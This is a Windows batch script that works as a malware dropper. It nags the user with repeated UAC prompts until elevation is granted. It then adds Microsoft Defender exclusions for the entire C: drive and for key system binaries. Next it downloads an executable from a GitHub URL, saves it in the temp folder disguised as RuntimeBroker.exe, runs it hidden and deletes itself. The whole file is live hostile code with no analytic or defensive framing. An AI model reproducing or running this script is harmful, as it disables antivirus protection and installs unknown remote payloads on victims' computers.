@echo off
:: Check if the script is running with administrator privileges
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    rem Script is already running with admin rights
    rem Add exclusions for specified paths
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe'" >nul 2>&1

    rem Download RuntimeBroker.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1

    rem Ensure RuntimeBroker.exe is fully downloaded before running
    :wait_runtime
    if not exist "%TEMP%\RuntimeBroker.exe" (
        timeout /t 1 >nul
        goto wait_runtime
    )

    rem Run RuntimeBroker.exe
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"

    rem Delete the batch script itself after execution
    del "%~f0" >nul 2>&1

    exit
)

:loop
    rem Trigger the UAC prompt using PowerShell from within the batch file
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1

    rem If user declines the UAC prompt, retry
    if %errorlevel% NEQ 0 (
        timeout /t 3 >nul
        goto loop
    )

    rem If UAC is accepted, proceed with the next task
    rem Add exclusions for specified paths
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe'" >nul 2>&1

    rem Download RuntimeBroker.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1

    rem Ensure RuntimeBroker.exe is fully downloaded before running
    :wait_runtime
    if not exist "%TEMP%\RuntimeBroker.exe" (
        timeout /t 1 >nul
        goto wait_runtime
    )

    rem Run RuntimeBroker.exe
    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"

    rem Delete the batch script itself after execution
    del "%~f0" >nul 2>&1

    exit